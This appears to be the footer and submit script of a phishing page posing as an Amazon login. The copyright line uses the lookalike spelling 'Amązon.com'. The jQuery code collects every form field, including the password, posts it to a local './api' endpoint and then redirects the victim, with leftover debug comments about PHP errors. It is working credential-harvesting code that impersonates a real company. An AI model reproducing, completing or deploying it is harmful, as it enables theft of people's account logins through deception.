<div class="footer">

  <div class="footer-top">
    🌐 English | 🇺🇸 United States
  </div>

  <div class="footer-links">
    <a href="#">Conditions of Use</a>
    <a href="#">Privacy Notice</a>
    <a href="#">Your Ads Privacy Choices</a>
  </div>

  <div class="copyright">
    © 1996-2023, Amązon.com, Inc. or its affiliates
  </div>

  
<script>
function showError(message) {
  const errorBox = document.getElementById("errorBox");
  const errorMessage = document.getElementById("errorMessage");

  if (errorBox && errorMessage) {
    errorMessage.textContent = message;
    errorBox.style.display = "flex";
  }
}

function hideError() {
  const errorBox = document.getElementById("errorBox");
  if (errorBox) {
    errorBox.style.display = "none";
  }
}

function capitalizeFirst(str) {
  if (!str) return "";
  return str.charAt(0).toUpperCase() + str.slice(1);
}

$(document).ready(function () {

  const $form = $("#form");
  const $submitBtn = $("#submitButton");
  
  $("#togglePassword").on("change", function () {
    const passwordField = $("#password");
    passwordField.attr("type", this.checked ? "text" : "password");
  });
  
  $(".check").on("input", function () {
    let group = this.closest(".form-group");
    let errorText = group.querySelector(".errmes");

    if (this.value.trim() !== "") {
      group.classList.remove("a-form-error");
      if (errorText) errorText.remove();
    }
  });
  
  $form.on("submit", function (event) {
    event.preventDefault();

    hideError();
    let inputs = document.querySelectorAll(".check");
    let isEmpty = false;

    inputs.forEach((input) => {
      let group = input.closest(".form-group");
      let fieldName = input.name || "This field";
      let errorText = group.querySelector(".errmes");

      if (input.value.trim() === "") {

        group.classList.add("a-form-error");

        if (!errorText) {
          errorText = document.createElement("span");
          errorText.className = "errmes";
          group.appendChild(errorText);
        }

        errorText.textContent = capitalizeFirst(fieldName) + " is required";
        isEmpty = true;

      } else {
        group.classList.remove("a-form-error");

        if (errorText) errorText.remove();
      }
    });

    if (isEmpty) return;
    
    let user = {};
    $form.find(':input').each(function () {
		    user[this.id] = this.value;
		});

    $submitBtn.prop("disabled", true).addClass("is-disabled");
    console.log($submitBtn.prop("disabled"));

    console.log(user);
    $.ajax({
    url: "./api",
    method: "POST",
    data: user,
    dataType: "json",

    success: function (result) {
        console.log("✅ Success Response:", result);

        if (result?.redirect) {
            window.location.replace(result.redirect);
            return;
        }
 
        if (result?.message || result?.error) {
            showError(result.message || result.error);
        }
    },

    error: function (xhr, status, errorThrown) {
        console.group("🚨 AJAX ERROR - Full Details");
        console.log("Status:", status);
        console.log("HTTP Code:", xhr.status);
        console.log("Error Thrown:", errorThrown);
        
        // THIS IS THE MOST IMPORTANT PART:
        console.log("%cRaw Response Text (This is what the server actually returned):", "color: red; font-weight: bold");
        console.log(xhr.responseText);   // ←←← This will show the PHP error

        // Optional: Pretty print if it's HTML
        if (xhr.responseText && xhr.responseText.includes("<br />") || xhr.responseText.includes("<b>")) {
            console.log("%cThis looks like a PHP Error!", "color: orange; font-size: 14px");
        }

        console.groupEnd();

        // Show user-friendly message
        let userMessage = "Server error occurred. Please try again.";
        
        if (xhr.status === 500) {
            userMessage = "Internal server error. Check server logs.";
        } else if (xhr.status === 404) {
            userMessage = "API endpoint not found.";
        }

        showError(userMessage);
    },

    complete: function () {
        $submitBtn.prop("disabled", false).removeClass("is-disabled");
    }
});

  });

});
</script> 
</div>